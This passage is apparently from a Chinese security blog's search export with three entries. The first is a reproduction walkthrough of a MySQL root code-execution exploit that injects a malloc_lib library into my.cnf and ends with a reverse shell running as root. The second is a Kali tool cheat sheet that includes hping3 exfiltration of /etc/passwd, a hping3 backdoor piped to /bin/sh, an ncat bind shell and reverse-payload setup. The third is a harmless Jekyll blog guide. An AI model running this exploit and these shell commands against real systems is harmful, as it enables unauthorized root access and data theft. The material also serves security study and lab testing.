./bin/mysqladmin -u root -p versionEnter password: ./bin/mysqladmin Ver 8.42 Distrib 5.6.32, for linux-glibc2.5 on x86_64Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Server version 5.6.32Protocol version 10Connection Localhost via UNIX socketUNIX socket /tmp/mysql.sockUptime: 2 min 54 secThreads: 1 Questions: 10 Slow queries: 0 Opens: 67 Flush tables: 1 Open tables: 60 Queries per second avg: 0.057 进程属性123$ ps -aux | grep mysqlroot 23 0.0 0.0 4440 748 ? S 10:02 0:00 /bin/sh bin/mysqld_safe --user=mysqlmysql 122 13.0 45.0 985540 457724 ? Sl 10:02 0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/d1190820d670.err --pid-file=/usr/local/mysql/data/d1190820d670.pid 可以看出，mysqld_safe封装脚本是以root权限启动的，而主要的mysqld进程是用较低权限的mysql用户启动的。 复现准备修改my.cnf权限12# 将/usr/local/mysql/my.cnf$ chown mysql:mysql /usr/local/mysql/my.cnf 创建attacker用户，并赋予file，select，insert权限，创建用于实验的数据库pocdb123CREATE DATABASE pocdb;GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%'; 复现修改一下mysql_hookandroot_lib.c的ip，port和my.cnf的位置：123#define ATTACKERS_IP "192.168.0.1"#define SHELL_PORT 6033#define INJECTED_CONF "/usr/local/mysql/my.cnf" 修改一下0ldSQL_MySQL_RCE_exploit.py的port和my.cnf的位置,然后执行1$ python 0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass 'p0cpass!' -dbhost 192.168.0.1 -dbname pocdb -mycnf /usr/local/mysql/my.cnf 执行成功后会在my.cnf里添加如下：12345678910111213/usr/local/mysql/bin/mysqld, Version: 5.6.32 (MySQL Community Server (GPL)). started with:Tcp port: 3306 Unix socket: /tmp/mysql.sockTime Id Command Argument160929 9:37:14 1 Query select "# 0ldSQL_MySQL_RCE_exploit got here :)[mysqld]malloc_lib='/usr/local/mysql/data/mysql_hookandroot_lib.so'[abyss]" INTO void 1 Query SET global general_log = off 虽然直接把日志写在my.cnf里重启mysql时会执行失败，但是不用担心,config_cleanup() 这个函数会清除这些。 重启mysql1234Listening on [0.0.0.0] (family 0, port 12344)Connection from [192.168.0.4] port 12344 [tcp/*] accepted (family 2, sport 34434)whoamiroot]]></content>
      <categories>
        <category>root code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Information Gathering]]></title>
    <url>%2F2016%2F09%2F27%2Fkali-information-gathering%2F</url>
    <content type="text"><![CDATA[概述Kali 里预装了很多安全与取证的相关工具，但是我所了解的却只有sqlmap、msf、nmap等少数几个，对于其他的却并没过多关注。于是今天想着整理一下Kali有关信息收集的工具，便于以后备查。 信息收集acccheck：描述：该工具被设计为一个密码字典攻击的工具，目标Windows身份验证通过SMB协议。 ace：描述：不明。 amap：描述：一个服务器枚举工具，使用这个工具可以识别正运行在一个指定端口或一个范围端口上的应用程序。用法：1$ amap -bq 192.168.1.110 1-1000 Automater描述：automater是分析URL的域名，IP地址，和MD5哈希OSINT工具。用法：12$ automater baidu.com$ automater -s robtex 50.116.53.73 braa描述：一个SNMP的扫描工具用法：1$ braa public@192.168.0.1:.1.3.6.* casefile描述：服务枚举：如DNS枚举用法：1$ casefile cdpsnarf描述：网络嗅探器，从CDP数据包中提取信息用法：1$ cdpsnarf -i eth0 -w cdpsnarf.pcap cisco-torch描述：快速发现远程Cisco的主机上运行Telnet、SSH、WEB、SNMP服务和启动NTP和字典攻击的服务发现。用法：1$ cisco-torch -A 192.168.99.202 copy-router-config描述：从思科设备上运行的SNMP拷贝配置文件。用法：1$ copy-router-config.pl 192.168.1.1 192.168.1.15 private dmitry描述：收集可能的子域，电子邮件地址，正常运行时间的信息，TCP端口扫描，查找，和更多。用法：1$ dmitry baidu.com dnmap描述：DNmap是一款基于Nmap的分布式框架，使用客户端/服务端架构，服务器接收命令并发送至客户端进行Nmap安全扫描，扫描完毕后，客户端返回扫描结果。用法：12345678# dnmap_server：$ echo "nmap -F 192.168.1.0/24 -v -n -oA sub1" &gt;&gt; dnmap.txt$ echo "nmap -F 192.168.0.0/24 -v -n -oA sub0" &gt;&gt; dnmap.txt$ dnmap_server -f dnmap.txt# dnmap_client：# (dnmap_server的ip)(dnmap_client的别名)$ dnmap_client -s 192.168.1.15 -a dnmap-client1 dnsenum描述：枚举域DNS信息和发现不连续的IP模块。用法：1$ dnsenum --noreverse -o mydomain.xml example.com dnsmap描述：枚举域DNS信息。用法：1$ dnsmap example.com -w /usr/share/wordlists/dnsmap.txt dnsrecon描述：直接出来目标服务器的 DNS名字 和 IP用法：1$ dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml dnstracer描述：直接出来目标服务器的 DNS名字 和 IP用法：1$ dnstracer -r 3 -v example.com dnswalk描述：DNS的调试器。它执行特定区域的区域传输，并检查数据库在许多方面的内部一致性，以及准确性。用法：12$ dnswalk example.com.$ dnswalk -r -d example.com. dotdotpwn.pl描述:测试发现软件例如HTTP、FTP、TFTP服务器遍历目录的漏洞，网络平台如CMS、ERP、博客等。用法：1$ dotdotpwn.pl -m http -h 192.168.1.1 -M GET enum4linux描述:枚举Windows主机和Samba 主机。用法：1$ enum4linux -U -o 192.168.1.200 enumiax描述: Inter Asterisk Exchange 协议 的用户名蛮力枚举。 enumiax可能在两种不同的模式操作； 顺序用户名猜测或字典攻击。用法：1$ enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 192.168.1.1 Fierce描述: ip 扫描器用法：1$ fierce -dns example.com fragroute描述: fragroute能够截取、修改和重写向外发送的报文，实现大部分在了Secure Networks Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection中叙述的IDS欺骗技术，包括IP、TCP层的数据包碎片以及数据包数据重叠等。用法：12345# fragroute：$ fragroute 192.168.1.123# fragtest ：$ fragtest ip-tracert frag-new 192.168.1.123 ghost-phisher描述: 是无线和以太网的安全审计和攻击软件用法：1$ ghost-phisher GoLismero描述: web漏洞扫描用法：1234567891011121314# 扫描一个网站，并显示在屏幕上的结果:$ golismero scan http://www.0535code.com# 获取nmap结果，扫描发现所有主机写HTML报告:$ golismero scan -i nmap_output.xml -o report.html# 获取结果OpenVAS和它们显示在屏幕上，但不扫描任何东西:$ golismero import -i openvas_output.xml# 显示所有可用配置文件的列表:$ golismero profiles# 显示所有可用插件的列表:$ golismero plugins# 显示所有信息和插件:$ golismero info brute_*# 从以前的扫描中转储数据库:$ golismero dump -db example.db -o dump.sql hping3描述: hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。用法：1234567891011121314151617# 使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。$ hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10# 端口扫描$ hping3 -I eth0 -S 192.168.10.1 -p 80# 对目标机发起大量SYN连接$ hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000# 文件传输 # 接收端： $ hping3 192.168.1.159 --listen signature --safe --icmp # 发送端： $ hping3 192.168.1.108 --icmp -d 100 --sign signature --file /etc/passwd# 木马功能 # 被控制端： $ hping3 127.0.0.1 --listen signature --safe --udp -p 12345 | /bin/sh # 控制端： $ echo ls &gt; test.cmd $ hping3 127.0.0.1 -p 12345 -d 100 --udp --sign signature --file ./test.cmd intrace描述:InTrace 是一个类似 traceroute 的应用，用户可以针对已建立的 TCP 连接跟踪其 IP 的跳跃。用法:1$ intrace -h www.example.com -p 80 -s 4 lbd描述:检测是否一个给定的域使用DNS或HTTP负载平衡（通过服务器：日期：服务器响应头和之间的差别）。用法:1$ lbd example.com maltego描述:收集DNS信息等。用法:1$ maltego masscan描述:快速的端口扫描工具。用法:123456# 扫描202.203.122.122的80端口，速率为10Kpps$ masscan -p 80 202.203.122.122 --rate=10000 # 扫描202.203.122.122的0-8100的端口，扫描结果输出到output.txt（二进制）（--banners选项值旗标，或者指纹）$ masscan -p 0-8100 202.203.122.122 --banners -oB output.txt # 打开显示模式，读取output.txt中的数据，并以xml的格式写到2.txt中$ masscan --open --banners --readscan output.txt -oX 2.txt Miranda描述:操作系统探测工具。用法:1234567# 打开网卡eth0$ miranda -v -i eth0 # 自动搜索upnp主机 upnp&gt; msearch upnp&gt; host list # 查看该主机的upnp设备列表 upnp&gt; host get [index] nmap描述:网络探测工具和安全/端口扫描器。用法:123456789101112131415161718192021222324252627$ Nmap [ 扫描类型 ... ] [ 通用选项 ] &#123; 扫描目标说明 &#125;$ nmap -v -A -sV 192.168.1.1# 全面扫描：$ nmap -T4 -A targetip# 主机发现：$ nmap -T4 -sn targetip# 端口扫描：$ nmap -T4 targetip# 服务扫描：$ nmap -T4 -sV targetip# 操作系统扫描：$ nmap -T4 -O targetip# SYN扫描:$ nmap -sS -T4 targetip# FIN扫描:$ nmap -sF -T4 targetip# ACK扫描:$ nmap -sA -T4 targetip# UDP扫描:$ NMAP -sU targetip# 漏洞扫描：$ nmap -sS -sV --script=vulscan/vulscan.nse target$ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target$ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target$ nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target$ nmap -sV --script=vuln target$ nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target nping描述:网络数据包生成工具/平实用程序。用法:1$ nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1 ndiff描述:实用工具Nmap扫描的结果比较。用法:1$ ndiff yesterday.xml today.xml ncat描述:连接和重定向的套接字。用法:1$ ncat -v --exec "/bin/bash" --allow 192.168.1.123 -l 4444 --keep-open p0f描述:是一款被动探测工具,通过分析网络数据包来判断操作系统用法:1$ p0f -i eth0 -p -o /tmp/p0f.log Recon-ng描述:与msf类似，Recon-ng框架是一个强大的工具，使用它可以自动的收集信息和网络侦查。用法:1234567891011121314151617$ recon-ng # 查看所有命令： [recon-ng][default]&gt; help # 查看所有有效的模块列表： [recon-ng][default]&gt; show modules # 使用recon/domains-hosts/baidu_site模块，枚举baidu网站的子域： [recon-ng][default]&gt; use recon/domains-hosts/baidu_site # 查看该模块下可配置选项参数： [recon-ng][default][baidu_site]&gt; show options # 配置SOURCE选项参数： [recon-ng][default][baidu_site]&gt; set SOURCE baidu.com # 启动信息收集： [recon-ng][default][baidu_site]&gt; run # 查看获取的数据： [recon-ng][default]&gt; use reporting/csv # 创建报告： [recon-ng][default][csv]&gt; run searchsploit描述: 从Exploit Database搜索exp用法：12$ searchsploit oracle windows remote$ searchsploit linux kernel 2.6 setoolkit描述: 社会工程师工具包用法：123456789$ setoolkit # 根据自己的需要，选择相应的编号进行操作: set&gt; 1 set&gt; 4 # 根据自己的目标系统选择相应的攻击载荷: set:payloads&gt; 2 # 输入攻击者的ip、端口： set:payloads&gt; IP address for the payload listener (LHOST):192.168.0.212 set:payloads&gt; Enter the PORT for the reverse listener:1234 smtp-user-enum描述: SMTP用户枚举是一个工具，用于枚举操作系统级别的用户帐户在Solaris通过SMTP服务（邮件）。用法：1$ smtp-user-enum -M VRFY -u root -t 192.168.1.25 snmpcheck描述: SNMP枚举工具。用法：1$ snmpcheck -t 192.168.1.2 -c public sslcaudit描述: 实用的自动化测试的SSL / TLS的客户端来抵抗中间人攻击。用法：1$ caudit -l 0.0.0.0:443 -v 1 SSLsplit描述: 中间人攻击，将https协议强制替换为http。。用法：1$ sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 SSLyze描述: 是一款使用Python实现的SSL扫描工具，它可以扫描出SSL中一些经典的配置错误。用法：1$ sslyze --regular www.example.com theharvester描述: 邮箱挖掘器。用法：1$ theharvester -d kali.org -l 500 -b google tlssled描述: TLSSLed是一个Linux bash脚本,它的功能是测试目标SSL/TLS(HTTPS)WEB 服务器的安全性。TLSSLed基于sslscan，功能包括：测试目标是否支持SSLv2协议、NULL cipher等等。用法：1$ tlssled 192.168.1.1 443 tshark描述: 可以直接过滤数据包导出用法：1$ tshark -f "tcp port 80" -i eth0 urlcrazy描述: 钓鱼域名。用法：1$ urlcrazy -k dvorak -r example.com whatweb描述: WhatWeb是一款网站指纹识别工具，主要针对的问题是：“这个网站使用的什么技术？”WhatWeb可以告诉你网站搭建使用的程序，包括何种CMS系统、什么博客系统、Javascript库、web服务器、内嵌设备等。WhatWeb有超过900个插件，并且可以识别版本号、email地址、账号、web框架、SQL错误等等。用法：1$ whatweb www.example.com Wireshark描述: 流量分析。用法：1$ wireshark xspy描述: 键盘记录器用法：1$ xspy yersinia描述: 是国外的一款专门针对交换机执行第二层攻击的一个攻击工具。用法：1$ yersinia -G zaproxy描述: 一个易于使用交互式的用于web应用程序漏洞挖掘的渗透测试工具。用法：1$ zaproxy]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>kali</tag>
        <tag>information gathering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github + Markdown + Jekyll 搭建博客]]></title>
    <url>%2F2016%2F07%2F04%2Fgithub-markdown-jekyll%2F</url>
    <content type="text"><![CDATA[概述Github + Markdown + Jekyll 搭建博客的步骤如下，不过首先得注册Github账号，以及创建一个Repository,命名格式为：username.github.io（username 必须和账号一致。）这样就生成了属于你的Github下的网页,其中过程可以参照GitHub Pages。 安装安装Kekyll需要以下环境： Ruby2.0以上 RubyGems Linux,Unix,Mac OS 安装Ruby2.012$ sudo apt-get install ruby2.0 $ sudo apt-get install ruby2.0-dev 由于我的Ubuntu 14.04默认的Ruby是1.9.3，而Ruby 2.0则需要用命令ruby2.0运行，程序前必须设定好运行版本，不然会运行错误。于是我强制替换了/usr/bin目录下与Ruby相关的符号链接到Ruby 2.0对应的版本，进行了如下步骤： 12345678$ cd /usr/bin/ $ ln -sf ruby2.0 ruby $ ln -sf gem2.0 gem $ ln -sf erb2.0 erb $ ln -sf irb2.0 irb $ ln -sf rake2.0 rake $ ln -sf rdoc2.0 rdoc $ ln -sf testrb2.0 testrb 替换完后还要更新下gem： 12$ gem update \-\-system $ gem pristine \-\-all 这时Ruby的默认版本就已经切换到Ruby 2.0了。当然虽然这样做比较暴力，但也是可以还原的，如果想切换会Ruby 1.9.3，只需要运行（请注意在Ubuntu 14.04中，Ruby 1.9.3的名称为ruby1.9.1）,这里另外附上还原Ruby 1.9.3的方法： 12345678910$ cd /usr/bin/ $ ln -sf ruby1.9.1 ruby $ ln -sf gem1.9.1 gem $ ln -sf erb1.9.1 erb $ ln -sf irb1.9.1 irb $ ln -sf rake1.9.1 rake $ ln -sf rdoc1.9.1 rdoc $ ln -sf testrb1.9.1 testrb $ gem update \-\-system $ gem pristine \-\-all 安装Jekyll12$ gem install jekyll $ gem install bundler 安装模板解释器RDiscount默认模板是Maruku，这里替换为RDiscount。Maruku是纯ruby写的Markdown模板解释器。RDiscount是C写的模板解释器，重点是它的效率比Maruku快很多。 1$ gem install rdiscount 新建一个Jekyll目录1$ jekyll new blogname 然后bundle12$ bundle update $ bundle install 启动server因为Jekyll自带一个服务器，所以可以直接运行服务。只不过它默认是只能本机访问4000端口（使用--host 服务器IP参数，可允许外部IP访问），而且并不是后台运行（可用--detach后台运行）。 1$ jekyll serve \-\-host 自己外网IP \-\-detach OK！ 可以用浏览器访问这个服务器http://IP:4000。关闭后台程序： 1$ kill -9 pid 修改配置1$ vim _config.yml 修改里面的url为username.github.io（username是你的github账户名） 上传github1234$ git init $ git add \-\-all $ git commit -m "博客" $ git push origin maste 过一会就可已访问username.github.io（username是你的github账户名）了 Jekyll主题接下来再说说jeykll的目录结构。Jekyll的核心其实是一个文本转换引擎。它的概念其实就是：你用你最喜欢的标记语言来写文章，可以是Markdown,也可以是 Textile, 或者就是简单的 HTML, 然后 Jekyll 就会帮你套入一个或一系列的布局中。在整个过程中你可以设置 URL 路径，你的文本在布局中的显示样式等等。这些都可以通过纯文本编辑来实现，最终生成的静态页面就是你的成果。 至于Jekyll的主题，你可以参照jekyllthemes。找到合适的主题之后，只要修改_config.yml即可，然后就是再_posts里写文章了，文章的命名格式为YYYY-MM-DD-name-of-post.md。而Markdown的语法可以参照Markdown语法,至于Markdown的编辑器，最好不要用vim，去下个专门的编辑器。]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>jekyll</tag>
        <tag>github</tag>
        <tag>blog</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
</search>
